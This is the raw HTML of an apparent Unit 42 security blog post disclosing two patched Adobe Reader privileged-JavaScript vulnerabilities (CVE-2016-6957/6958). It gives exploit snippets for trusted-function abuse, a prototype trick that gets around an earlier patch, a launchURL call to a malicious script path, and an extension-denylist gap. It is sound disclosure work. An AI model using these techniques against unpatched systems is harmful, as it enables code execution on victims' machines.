
<!doctype html>
<html >
  <head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="apple-touch-icon" sizes="180x180" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/apple-touch-icon.png">
	<link rel="icon" type="image/png" sizes="32x32" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-32x32.png">
	<link rel="icon" type="image/png" sizes="16x16" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/favicon-16x16.png">
	<link rel="manifest" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/site.webmanifest">
	<link rel="mask-icon" href="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/favicon/safari-pinned-tab.svg" color="#000000">
	<meta name="msapplication-TileColor" content="#000000">
	<meta name="theme-color" content="#000">
  <title>Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days</title>
<link rel="alternate" hreflang="en" href="https://unit42.paloaltonetworks.com/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/" />
<link rel="alternate" hreflang="ja" href="https://unit42.paloaltonetworks.jp/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/" />

<!-- This site is optimized with the Yoast SEO plugin v12.6.2 - https://yoast.com/wordpress/plugins/seo/ -->
<meta name="robots" content="max-snippet:-1, max-image-preview:large, max-video-preview:-1"/>
<link rel="canonical" href="https://unit42.paloaltonetworks.com/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/" />
<meta property="og:locale" content="en_US" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days" />
<meta property="og:description" content="This post is also available in: 日本語 (Japanese)We recently discovered two zero-day vulnerabilities in Adobe Reader. Adobe has since released a patch (on October 6, 2016) to fix these vulnerabilities, which are named CVE-2016-6957 and CVE-2016-6958. These vulnerabilities could allow an attacker to compromise Adobe Reader by bypassing restrictions on JavaScript API execution (CVE-2016-6957) and..." />
<meta property="og:url" content="https://unit42.paloaltonetworks.com/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/" />
<meta property="og:site_name" content="Unit42" />
<meta property="article:tag" content="adobe" />
<meta property="article:tag" content="Adobe Reader" />
<meta property="article:tag" content="vulnerability" />
<meta property="article:section" content="Threat Prevention" />
<meta property="article:published_time" content="2016-10-17T12:00:25+00:00" />
<meta property="article:modified_time" content="2020-07-03T01:11:52+00:00" />
<meta property="og:updated_time" content="2020-07-03T01:11:52+00:00" />
<meta property="og:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:secure_url" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<meta property="og:image:width" content="650" />
<meta property="og:image:height" content="300" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:description" content="This post is also available in: 日本語 (Japanese)We recently discovered two zero-day vulnerabilities in Adobe Reader. Adobe has since released a patch (on October 6, 2016) to fix these vulnerabilities, which are named CVE-2016-6957 and CVE-2016-6958. These vulnerabilities could allow an attacker to compromise Adobe Reader by bypassing restrictions on JavaScript API execution (CVE-2016-6957) and..." />
<meta name="twitter:title" content="Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days" />
<meta name="twitter:image" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" />
<!-- / Yoast SEO plugin. -->

<link rel='dns-prefetch' href='//www.google.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel="alternate" type="application/rss+xml" title="Unit42 &raquo; Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days Comments Feed" href="https://unit42.paloaltonetworks.com/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days/feed/" />
<meta property="og:likes" content="1"/>
<meta property="og:readtime" content="8"/>
<meta property="og:views" content="20,937"/>
<meta property="og:date_created" content="October 17, 2016 at 5:00 AM"/>
<meta property="og:post_length" content="2238"/>
<meta property="og:category" content="Threat Prevention"/>
<meta property="og:category" content="Unit 42"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/threat-prevention-2/"/>
<meta property="og:category_link" content="https://unit42.paloaltonetworks.com/category/unit42/"/>
<meta property="og:author" content="Gal De Leon"/>
<meta property="og:authorlink" content="https://unit42.paloaltonetworks.com/author/"/>
<meta property="og:author_image_link" content="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/11/unit-news-meta.svg"/>
<script type="application/ld+json">{"@context":"https:\/\/schema.org","@type":"BlogPosting","headline":"Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days","name":"Palo Alto Networks Discovers Two Adobe Reader Privileged JavaScript Zero-Days","description":"This post is also available in: \u65e5\u672c\u8a9e (Japanese)We recently discovered two zero-day vulnerabilities in Adobe Reader. Adobe has since released a patch (on October 6, 2016) to fix these vulnerabilities, which are named CVE-2016-6957 and CVE-2016-6958. These vulnerabilities could allow an attacker to compromise Adobe Reader by bypassing restrictions on JavaScript API execution (CVE-2016-6957) and...","url":"https:\/\/unit42.paloaltonetworks.com\/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days\/","mainEntityOfPage":"https:\/\/unit42.paloaltonetworks.com\/unit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days\/","datePublished":"October 17, 2016","articleBody":"We recently discovered two zero-day vulnerabilities in Adobe Reader. Adobe has since released a patch (on October 6, 2016) to fix these vulnerabilities, which are named CVE-2016-6957 and CVE-2016-6958. These vulnerabilities could allow an attacker to compromise Adobe Reader by bypassing restrictions on JavaScript API execution (CVE-2016-6957) and security provisions that prevent arbitrary execution of scripts such as those written in Python (CVE-2016-6957). In this blog post, I will provide a technical walkthrough of these vulnerabilities, how they can be exploited, and how Palo Alto Networks customers are protected.\r\nJavaScript in PDF Files\r\nPDF file format is quite rich. It allows you to render text, pictures, and even 3D objects. It also contains a JavaScript engine that renders scripts embedded within a document. Such scripts are used to create dynamic content that interacts with the user. Adobe\u2019s JavaScript API manual documents most of the usable functions and global variables from such scripts.\r\n\r\nJavaScript within a PDF file is executed under one of two different contexts \u2013 \u201cpriviledged\u201d and \u201cnonprivileged.\u201d. In \u201cprivileged\u201d context, the set of API functions that can be called is richer and contains some functions that can be dangerous if not used with great care. These functions are called secured functions, marked in the JavaScript API Manual by a red \u2018S\u2019 enclosed in a circle.\r\n\r\n\r\n\r\nThere is a set of vulnerabilities called \u2018JavaScript Privilege Escalation\u2019. Such bugs allow JavaScript executing under nonprivileged context to run arbitrary scripts under privileged context and thus call any desired, secured function. Let\u2019s look at an example of this scenario.\r\nExecution Stages\r\nJavaScript code usually executes under nonprivileged context. There are three exceptions where the context is automatically escalated to privileged context by Adobe\u2019s engine:\r\n\r\n \tBatch Application Initialization \u2013 JavaScript that executes when a document is loaded. This is done at a very early stage where an attacker cannot inject any JavaScript code. We will describe that stage in details later on.\r\n \tConsole \u2013 JavaScript that is executed from Adobe Reader\u2019s debugging console.\r\n \tApplication Initialization Events \u2013 Callbacks for certain events.\r\n\r\n\r\nBatch Stage\r\nAt this stage Adobe Reader executes all the JavaScript files located under the\r\nC:\\Program Files\\Adobe\\Reader 11.0\\Reader\\Javascripts directory. Unless some custom script or plugin is deployed, this directory should only include the JSByteCodeWin.bin file.\r\n\r\nJSByteCodeWin.bin consists of SpiderMonkey 1.8 XDR bytecode. It can be decompiled using a tool written by Gabor Molnar, which is found in his github. By decompiling it you can see that Adobe implements many functions in JavaScript rather than native code. Since some of these functions need to execute secured functions, there is a need for some mechanism that allows it to execute them later on and not just in early\/unique stages.\r\nTrusted Functions\r\nTo solve this problem, Adobe introduced the concept of trusted functions. These can be defined by the secured function app.trustedFunction. Such functions can call secured functions, regardless of the execution stage.\r\n\r\nAdobe defines many functions as trusted functions at the Batch stage in JSByteCodeWin.bin, so they can later be called.\r\n\r\nAn example is the ANSendApprovalToAuthorEnabled function:\r\nvar ANSendApprovalToAuthorEnabled = app.trustedFunction(function (doc) {\r\n    app.beginPriv();\r\n    var hasAddr = doc.Collab.initiatorEmail; \/\/ privileged\r\n    app.endPriv();\r\n    ...\r\n});\r\n\r\nBeing a trusted function doesn\u2019t mean that its entire code executes under privileged context. This only means that the function can modify its context by calling app.beginPriv. Only code that executes in between app.beginPriv and app.endPriv block is privileged. Note that privileged context isn\u2019t \u201cpassed down\u201d between functions you call from within the beginPriv\/endPriv block, and those will have to call app.beginPriv to raise their privilege level as well. If a function context was ended without decreasing the privilege level (by calling app.endPriv), it will automatically decrease at the end of its scope.\r\n\r\n\r\nAbusing Trusted Functions\r\nImagine Adobe defines a trusted function at \u2018Batch\u2019 stage that looks like this:\r\nvar vulnerableFunc = app.trustedFunction(function (doc) {\r\n    app.beginPriv();\r\n    doc.displayText(\"Hello, World!\"); \/* vulnerableFunc() assumes argument is a Doc object *\/\r\n    app.endPriv();\r\n});\r\nThat means it can later raise its context to privileged by calling app.beginPriv. The vulnerableFunc function accepts an argument, \u2018doc\u2019, which it assumes to be of type \u2018Doc\u2019 object.\r\n\r\nSince there are no type-safety checks in JavaScript, an attacker can pass any object as a doc argument. This allows attackers to execute any secured function they desire by abusing the above code.\r\nvar fakeDoc = new Object();\r\nfakeDoc.displayText = someSecuredFunction;\r\nvulnerableFunc(fakeDoc, \"Argument\")\r\n\r\nWe create a new object named \u2018fakeDoc\u2019. We then set the member \u2018displayText\u2019 to reference some secured function we want to call. Then, we call \u2018vulnerableFunc\u2019 passing \u2018fakeDoc\u2019 as an argument.\r\nvar vulnerableFunc = app.trustedFunction(function (doc) {\r\n    app.beginPriv();\r\n    doc.displayText(\"Hello, World!\"); \/* doc.displayText = doc.someSecuredFunction !! *\/\r\n    app.endPriv();\r\n});\r\n\r\nThe vulnerableFunc function then changes context to privileged, calling app.beginPriv. This is allowed since vulnerableFunc was previously defined as a trusted function (for instance, at Batch stage). It then calls doc.displayText, which, at this point, references the secured function someSecuredFunction. This will then trigger a call to that secured function, which is allowed since the context is now privileged.\r\n\r\nIn this example, we abused the fact that a trusted function receives a callback as an argument. But since JavaScript is a very dynamic language, there are many other cases in which callbacks are unintentionally called. Getters and setters functions can be defined, global variables can be overridden, and much more.\r\n\r\nThe approach Adobe takes to fix such vulnerabilities is to tweak the JavaScript engine to prevent specific behaviors. Examples include preventing the call to a privileged function from getters\/setters, eval(), etc.\r\nANSendApprovalToAuthorEnabled\r\nWhile manually auditing all the trusted functions, I came across the function that follows:\r\nvar ANSendApprovalToAuthorEnabled = app.trustedFunction(function (doc) {\r\n    app.beginPriv();\r\n    var hasAddr = doc.Collab.initiatorEmail;\r\n    app.endPriv();\r\n    return event.rc = doc &amp;&amp;\r\n        hasAddr &amp;&amp;\r\n        doc.requestPermission(permission.annot, permission.canExport) == permission.granted &amp;&amp;\r\n        doc.requestPermission(permission.annot, permission.modify) == permission.granted;\r\n});\r\n\r\nThis seems like the perfect candidate for calling an arbitrary secured function. It takes doc as an argument and calls doc.requestPermission twice \u2013 which is fully controlled. The only thing is that doc.requestPermission isn\u2019t called within the privileged portion of ANSendApprovalToAuthorEnabled (not between app.beginPriv\/app.endPriv). This is very easy to bypass though; all you have to do is to set requestPermission to reference app.beginPriv, which will raise the privilege level.\r\n\r\nTo bypass the hasAddr condition, all we have to do is set doc.Collab.initiatorEmail to \u2018true\u2019. Note that we cannot execute privileged code from there since this isn\u2019t a function call but a member reference.\r\nvar fakeDoc = {};\r\nfakeDoc.__proto__ = app;\r\nfakeDoc.Collab = {};\r\nfakeDoc.Collab.initiatorEmail = true;\r\nfakeDoc.requestPermission = app.beginPriv;\r\npermission.granted.__defineGetter__(function() {\r\n    fakeDoc.requestPermission = someSecuredFunction;\r\n});\r\nANSendApprovalToAuthorEnabled(fakeDoc); \r\n\r\nWhat happens then is the first call to doc.requestPermission is translated to a call to app.beginPriv that raises the context to privileged. Its return value is then compared to permisison.granted, which triggers the custom getter function I created. That function modifies fakeDoc.requestPermission to the secured function we want to call. ANSendApprovalToAuthorEnabled then calls doc.requestPermission again, this time calling an arbitrary secured function from privileged context.\r\n\r\nWhen I investigated Adobe Reader, I didn\u2019t review its latest version by mistake. After I upgraded it, I found out this vulnerability was patched and previously discovered by MWR Labs (CVE-2015-4451).\r\nCVE-2015-4451 Patch\r\nStill, the way my exploit failed surprised me. An exception was raised when I copied the reference to the app.beginPriv function into fakeDoc.requestPermission.\r\nfakeDoc.requestPermission = app.beginPriv;\r\nNotAllowedError: Security settings prevent access to this property or method.\r\nApp.beginPriv:9:Doc undefined:Open\r\n\r\nThis means that the way Adobe fixed the bug is by preventing attackers from copying a reference to app.beginPriv. Without a reference to that function, they are unable to raise the context to privileged, so they can only call an unsecured function that isn\u2019t a threat. Besides that, the bug still exists. So if I can find an alternative way to gain a reference to app.beginPriv, this bug is still exploitable.\r\nJavaScript to the Rescue!\r\nI tried to find a creative way to abuse JavaScript into copying a reference to app.beginPriv, and I came up with the following solution:\r\nfunction get_beginPriv() {\r\n\tvar myApp = {};\r\n\tmyApp.__proto__ = app;\r\n\treturn myApp.beginPriv;\r\n}\r\n\r\nRather than copying a reference to app.beginPriv straight from the global app object, I copied its prototype into another newly created object. Copying the prototype of an object means to copy all of its members and methods. I then gained a reference to beginPriv from that copied instance, which Adobe didn\u2019t prevent. This means I can still abuse ANSendApprovalToAuthorEnabled into executing an arbitrary secured function.\r\nGaining Native Code Execution\r\nIn their presentation at DEFCON 2015, the HP ZDI team showed how to abuse such vulnerabilities into native code execution. This is done using undocumented, secured APIs that allow writing files to the disk.\r\n\r\n\r\n\r\nThe function Collab.uriPutData can be used to write arbitrary files to the disk. The only thing is that it executes from the rendered process of Adobe Reader, which, in turn, executes at a low integrity level. This means that the locations where you can write files to are very limited. The strategy described in ZDI\u2019s presentation only works for Adobe Acrobat Pro edition, which does not use the sandbox. They used Collab.uriPutData to write a DLL to the disk and abuse a DLL-hijacking bug in Adobe Reader to load it.\r\n\r\nI tried to take a different approach that would work for the free edition of Adobe Reader too.\r\napp.launchURL\r\nThis is a secured function that launches the browser to a URL, supplied as an argument. By abusing the above privileged JavaScript vulnerability, an attacker can call it.\r\n\r\n\r\n\r\nCalling this function I found out it launches the default browser. So I was wondering how it knows which executable file to launch (chrome.exe, firefox.exe, iexplore.exe, or any other browser).\r\n\r\nSetting a breakpoint on kernel32!CreateProcessW, I noticed that it creates a process using shell32!ShellExecute.\r\nBreakpoint 1 hit\r\neax=00000000 ebx=00000000 ecx=00000001 edx=00000001 esi=040ff8d4 edi=000002e4\r\neip=75a0103d esp=040ff824 ebp=040ff918 iopl=0         nv up ei pl zr na pe nc\r\ncs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246\r\nkernel32!CreateProcessW:\r\n75a0103d 68c0441200      push    1244C0h\r\n0:014&gt; k\r\n # ChildEBP RetAddr  \r\n00 040ff820 74bb558d kernel32!CreateProcessW\r\n01 040ff918 74bc2b96 SHELL32!_SHCreateProcess+0x251\r\n02 040ff96c 74bb5391 SHELL32!CExecuteApplication::_CreateProcess+0xfc\r\n03 040ff97c 74bb5345 SHELL32!CExecuteApplication::_TryCreateProcess+0x2e\r\n04 040ff98c 74bb4791 SHELL32!CExecuteApplication::_DoApplication+0x48\r\n05 040ff99c 74bcf619 SHELL32!CExecuteApplication::Execute+0x33\r\n06 040ff9bc 74bb49dc SHELL32!CExecuteAssociation::_DoCommand+0x88\r\n07 040ff9e0 74bcf69b SHELL32!CExecuteAssociation::_TryApplication+0x41\r\n\r\nThe shell32!ShellExecute function is a winapi that launches the right process, given a file and an optional protocol handler. It knows which process to launch, matching a registry key for a protocol\/extension. That is why the default browser is launched when calling app.launchURL \u2013 it registers itself as the handler of the \u2018http:\u2019 protocol. You can read more about it in the MSDN page for ShellExecute.\r\n\r\nAs opposed to what the documentation of app.launchURL states, you can launch a URL beginning with the \u2018file:\/\/\u2019. The only difference is that there\u2019s a message box asking users whether they accept launching an application from that path. This means that we can call shell32!ShellExecute with an arbitrary path and an arbitrary extension. So I tried launching a PowerShell script ending with the \u2018ps1\u2019 extension.\r\napp.launchURL(\"file:\/\/c:\/temp\/malicious.ps1\");\r\n\r\nThat didn\u2019t work; no PowerShell script was executed.\r\nExtensions Denylist\r\nAdobe did think that giving the ability to call shell32!ShellExecute is dangerous, so they created a denylist for all extensions they think allow an attacker to execute arbitrary code. That denylist is found under the following registry key:\r\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Adobe\\Acrobat Reader\\11.0\\FeatureLockDown\\cDefaultLaunchAttachmentPerms \r\n\r\n.ade:3|.adp:3|.app:3|.arc:3|.arj:3|.asp:3|.bas:3|.bat:3|.bz:3|.bz2:3|.cab:3|.chm:3|.class:3|.cmd:3|.com:3|.command:3|\u2026\r\n\r\nI reviewed the list, trying to find an extension Adobe forgot to denylist. They did quite a good job of excluding all trivial extensions. I noticed that they tried to prevent Python scripts from executing:\r\n.py:3|.pyc:3|.pyo:3|.pyd:3|\u2026\r\n\r\nBut they forgot to denylist the \u2018.pyw\u2019 extension, which corresponds to Python File (no console). This means that an attacker can execute arbitrary Python scripts (if installed) using app.launchURL.\r\nConclusion\r\nThe JavaScript engine that Adobe implements contains functions that can introduce potential security vulnerabilities. In order to enforce security measures for the JavaScript API, they introduced features such as secured and trusted functions. But it is possible to abuse the nature of the JavaScript language to cause some unexpected behaviors when combined with those security features. Their efforts to mitigate such issues are thorough, but there still appear to be viable exploitation pathways. We thank Adobe for their quick attention to the issues described in this post, and for the release of the October 6 patch.\r\n\r\nPalo Alto Networks customers who deploy our Next-Generation Security Platform are protected from zero-day vulnerabilities such as these. Threat Prevention (an essential service for our next-generation firewalls that includes capabilities such as\u00a0application control,\u00a0IPS, anti-malware,\u00a0and command and control protection), WildFire,\u00a0and\u00a0URL Filtering services provide our customers with comprehensive protection and automatic updates against previously unknown threats within as little as 5 minutes.\r\n\r\n","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Gal De Leon"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='bodhi-svgs-attachment-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/svg-support/css/svgs-attachment.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.0.1' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"20967","token":"7e15a0f8b3","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=20967' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-palo-alto-networks-discovers-two-adobe-reader-privileged-javascript-zero-days%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-20967 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
